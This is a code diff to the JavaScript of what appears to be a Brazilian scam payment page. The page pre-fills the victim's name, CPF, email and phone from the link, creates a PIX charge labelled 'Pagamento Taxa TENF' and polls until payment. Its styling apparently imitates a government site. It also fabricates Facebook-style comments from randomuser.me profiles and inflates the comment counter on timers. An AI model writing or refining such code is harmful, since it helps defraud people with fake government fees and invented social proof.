@@ -269,37 +269,31 @@ fbq('track', 'PageView');
     var _cpf=(_p.get('cpf')||'').replace(/\D/g,'');
     var _email=(_p.get('email')||'cliente@email.com').trim();
     var _fone=(_p.get('telefone')||'11999999999').replace(/\D/g,'');
+
     function formatarNome(n){if(!n)return '';return n.toLowerCase().split(' ').filter(Boolean).map(function(w){return w.charAt(0).toUpperCase()+w.slice(1);}).join(' ');}
     function formatarCPF(c){return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');}
+    
     var nomeOk=formatarNome(_nome);
     if(nomeOk) document.getElementById('header-user-name').textContent=nomeOk.split(' ')[0];
+
     async function pixIniciar(){
         document.getElementById('pix-loading').style.display='block';
         try{
-            var trackingData = {
-                utm_source: _p.get('utm_source') || "",
-                utm_medium: _p.get('utm_medium') || "",
-                utm_campaign: _p.get('utm_campaign') || "",
-                utm_content: _p.get('utm_content') || "",
-                utm_term: _p.get('utm_term') || "",
-                src: _p.get('src') || "",
-                sck: _p.get('sck') || ""
-            };
             var payload = {
                 nome:         nomeOk || 'Cliente',
-                cpf:          _cpf.replace(/\D/g,''),
+                cpf:          _cpf,
                 email:        _email,
-                telefone:     _fone.replace(/\D/g,''),
+                telefone:     _fone,
                 valor:        PIX_VALOR_CENTS,
-                descricao:    'Pagamento Aprovado.',
-                utm_source:   trackingData.utm_source,
-                utm_medium:   trackingData.utm_medium,
-                utm_campaign: trackingData.utm_campaign,
-                utm_content:  trackingData.utm_content,
-                utm_term:     trackingData.utm_term,
-                utm_id:       _p.get('utm_id') || '',
-                src:          trackingData.src,
-                sck:          trackingData.sck
+                descricao:    'Pagamento Taxa TENF', 
+                utm_source:   _p.get('utm_source') || "",
+                utm_medium:   _p.get('utm_medium') || "",
+                utm_campaign: _p.get('utm_campaign') || "",
+                utm_content:  _p.get('utm_content') || "",
+                utm_term:     _p.get('utm_term') || "",
+                utm_id:       _p.get('utm_id') || "",
+                src:          _p.get('src') || "",
+                sck:          _p.get('sck') || ""
             };
             var res = await fetch(BACKEND_URL + '/criar_pix.php', {
                 method: 'POST',
@@ -309,37 +303,47 @@ fbq('track', 'PageView');
             var data = await res.json();
 
             if(!res.ok || !data.success) throw new Error();
+            
             _pixTxid = data.paymentCode;
             _pixCode = data.pixCode;
+
             document.getElementById('pix-nome-show').textContent = nomeOk;
             document.getElementById('pix-cpf-show').textContent = _cpf ? formatarCPF(_cpf) : '---';
             document.getElementById('pix-code-box').textContent = _pixCode;
             document.getElementById('pix-qr-img').innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode) + '" style="border-radius:8px;max-width:190px;">';
             document.getElementById('pix-loading').style.display = 'none';
             document.getElementById('pix-main').style.display = 'block';
+            
             pixPolling();
-        }catch(err){ document.getElementById('pix-loading').style.display='none'; alert('Erro ao gerar PIX.'); }
+        } catch(err) { 
+            document.getElementById('pix-loading').style.display='none'; 
+            alert('Erro ao gerar PIX.'); 
+        }
     }
+
     function pixPolling(){
         if (_pixTimer) clearInterval(_pixTimer);
         _pixTimer = setInterval(async function(){
             try {
                 if (!_pixTxid) return;
+
                 var r = await fetch(BACKEND_URL + '/status_pix.php?id=' + encodeURIComponent(_pixTxid));
                 var s = await r.json();
-                if (!s.success) return;
-
-                if(s.status === 'approved') {
+                
+                if(s.success && s.status === 'approved') {
                     clearInterval(_pixTimer);
+                    
                     var statusFeedback = document.getElementById('pix-status-feedback');
                     if(statusFeedback) {
                         statusFeedback.innerHTML = '<i class="fas fa-check-circle" style="color: var(--gov-green); font-size: 18px;"></i> <span style="color: var(--gov-green);">Pagamento Confirmado! Redirecionando...</span>';
                     }
+                    
                     var url = new URL(PIX_REDIRECT);
                     var curParams = new URLSearchParams(window.location.search);
                     curParams.forEach(function(value, key) {
                         url.searchParams.set(key, value);
                     });
+                    
                     setTimeout(function() {
                         window.location.href = url.toString();
                     }, 1500);
@@ -347,12 +351,14 @@ fbq('track', 'PageView');
             } catch(e) {}
         }, 3000);
     }
+
     function pixAba(aba){
         document.getElementById('ptab-copia').classList.toggle('on',aba==='copia');
         document.getElementById('ptab-qr').classList.toggle('on',aba==='qr');
         document.getElementById('ppane-copia').classList.toggle('on',aba==='copia');
         document.getElementById('ppane-qr').classList.toggle('on',aba==='qr');
     }
+
     function pixCopiar(){
         navigator.clipboard.writeText(_pixCode).then(function(){
             var btn=document.getElementById('pix-copy-btn'); var orig=btn.innerHTML;
@@ -360,6 +366,7 @@ fbq('track', 'PageView');
             setTimeout(function(){btn.innerHTML=orig;},2000);
         });
     }
+
     // --- LOGICA DE COMENTARIOS AVANÇADA (MANTIDA ORIGINAL) ---
     var totalComments = 25738;
     var storedComments = [];
@@ -400,9 +407,9 @@ fbq('track', 'PageView');
         ];
         messages.forEach((msg, i) => {
             setTimeout(() => {
-                fbLoadingSpan.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Carregando comentários`;
+                if(fbLoadingSpan) fbLoadingSpan.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Carregando comentários`;
                 createRandomComment(msg, false);
-                fbLoadingSpan.textContent = "Comentários atualizados.";
+                if(fbLoadingSpan) fbLoadingSpan.textContent = "Comentários atualizados.";
                 fbHeaderOutside.textContent = `Comentários (${++totalComments})`;
             }, (i + 1) * 10000);
         });
@@ -429,13 +436,18 @@ fbq('track', 'PageView');
         fbContainer.insertBefore(cItem, fbContainer.firstChild);
     }
     async function getRandomUser() {
-        const res = await fetch('https://randomuser.me/api/?nat=br');
-        const data = await res.json();
-        return data.results[0];
+        try {
+            const res = await fetch('https://randomuser.me/api/?nat=br');
+            const data = await res.json();
+            return data.results[0];
+        } catch(e) {
+            return { name: { first: 'Usuário' }, picture: { medium: 'images/favic.png' } };
+        }
     }
     function saveCommentsToLocal() {
         localStorage.setItem('commentsData', JSON.stringify(storedComments));
     }
+    
     // Inicializar
     initFacebookComments();
     pixIniciar();
